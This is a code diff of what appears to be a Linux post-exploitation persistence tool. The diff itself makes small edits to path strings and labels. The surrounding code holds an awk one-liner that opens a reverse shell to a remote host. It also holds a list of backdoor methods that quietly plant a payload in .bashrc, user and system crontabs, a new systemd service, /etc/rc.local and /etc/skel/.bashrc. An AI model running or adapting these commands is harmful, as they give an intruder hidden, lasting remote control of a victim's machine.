@@ -212,6 +212,8 @@ export TMPGOFILE=$(echo $WRITABLE_DIR/$(uuidgen).go)
 export PIPDIR=$(echo $WRITABLE_DIR/$(uuidgen))
 export PIP3DIR=$(echo $WRITABLE_DIR/$(uuidgen))
 export EASYINSTALLDIR=$(echo $WRITABLE_DIR/$(uuidgen))
+echo "-----------------------"
+
 
 METHODS=(
     "awk , awk --version , awk 'BEGIN {s = \\\"/inet/tcp/0/$RHOST/$RPORT\\\"; while(42) { do{ printf \\\"shell>\\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \\\$0 |& s; close(c); } } while(c != \\\"exit\\\") close(s); }}' /dev/null?"
@@ -267,10 +269,10 @@ enum_methods() {
 enum_doors() {
 
     DOORS=(
-	"bashrc , if test -f ~/.bashrc; then touch ~/.bashrc; else touch ~/.bashrc &&  ~/.bashrc; fi , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> ~/.bashrc?"
+	"$HOME/.bashrc , if test -f $HOME/.bashrc; then touch $HOME/.bashrc; else touch $HOME/.bashrc &&  $HOME/.bashrc; fi , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> $HOME/.bashrc?"
 	"/var/spool/cron/crontabs/$(whoami) , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD; if grep -qi [A-Za-z0-9] $TMPCRONWITHPAYLOAD; then crontab $TMPCRONWITHPAYLOAD; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD && chmod +x $TMPCRONWITHPAYLOAD?"
 	"/etc/crontab , find /etc/ -name crontab -writable | grep -qi crontab , echo \"$CRON $(whoami) $PAYLOAD\" >> /etc/crontab?"
-	"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$SERVICESHELLSCRIPT; if test -f /etc/systemd/system/$SERVICEFILE; then echo > /dev/null; else touch /etc/systemd/system/$SERVICEFILE; echo \"[Service]\" >> /etc/systemd/system/$SERVICEFILE; echo \"Type=oneshot\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$SERVICESHELLSCRIPT\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$SERVICEFILE; echo \"[Install]\" >> /etc/systemd/system/$SERVICEFILE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$SERVICEFILE; chmod 644 /etc/systemd/system/$SERVICEFILE; systemctl start $SERVICEFILE 2> /dev/null & sleep .0001; systemctl enable $SERVICEFILE 2> /dev/null & sleep .0001; fi;?"
+	"/etc/systemd/ , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$SERVICESHELLSCRIPT; if test -f /etc/systemd/system/$SERVICEFILE; then echo > /dev/null; else touch /etc/systemd/system/$SERVICEFILE; echo \"[Service]\" >> /etc/systemd/system/$SERVICEFILE; echo \"Type=oneshot\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$SERVICESHELLSCRIPT\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$SERVICEFILE; echo \"[Install]\" >> /etc/systemd/system/$SERVICEFILE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$SERVICEFILE; chmod 644 /etc/systemd/system/$SERVICEFILE; systemctl start $SERVICEFILE 2> /dev/null & sleep .0001; systemctl enable $SERVICEFILE 2> /dev/null & sleep .0001; fi;?"
 	"/etc/rc.local , if test -f /etc/rc.local; then touch /etc/rc.local; else touch /etc/rc.local &&  /etc/rc.local; fi , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
 	"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
     )
